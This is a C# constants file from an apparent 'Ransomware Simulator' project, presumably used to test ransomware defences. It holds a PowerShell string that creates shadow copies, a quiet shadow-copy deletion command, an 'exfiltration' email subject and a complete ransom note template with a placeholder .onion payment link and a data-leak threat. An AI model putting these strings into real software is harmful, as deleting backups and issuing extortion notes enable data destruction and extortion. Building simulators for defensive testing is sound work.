using Microsoft.Extensions.Configuration;
using System;
using System.Collections.Generic;
using System.Text;

namespace RansomwareSimulator.Helper
{
    public static class Consts
    {

        public const byte Secret = 000;
        public static readonly string WildCard = "*.";
        public static readonly string EmailSubject = "Ransomware Simulator exfiltration: {0}";
        public static readonly string CreateShadow = "-Command (gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible').ShadowID";
        public static readonly string DeleteShadow = "delete shadows /shadow={0} /quiet";
        public static readonly string GUIDRegex = @"(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}";
        public static readonly string NoItemFound = "No items found";
        public static readonly string RansomNote = @"
All your important files are encrypted!
Any attempts to restore your files with the thrid-party software will be fatal for your files!
RESTORE YOU DATA POSIBLE ONLY BUYING private key from us.
There is only one way to get your files back:

| 1. Download Tor browser - https://www.torproject.org/ and install it.
| 2. Open link in TOR browser - http://somerandomstuffpointingtosomerandomsupportpage.onion/?
This link only works in Tor Browser! 
| 3. Follow the instructions on this page

 ###  Attention! ###
 # Do not rename encrypted files.
 # Do not try to decrypt using third party software, it may cause permanent data loss.
 # Decryption of your files with the help of third parties may cause increased price(they add their fee to our)
 # Tor Browser may be blocked in your country or corporate network. Use https://bridges.torproject.org 
 # Tor Browser user manual https://tb-manual.torproject.org/about

!!! We also download huge amount of your private data, including finance information, clients personal info, network diagrams, passwords and so on. Don't forget about GDPR.
";
    }
}
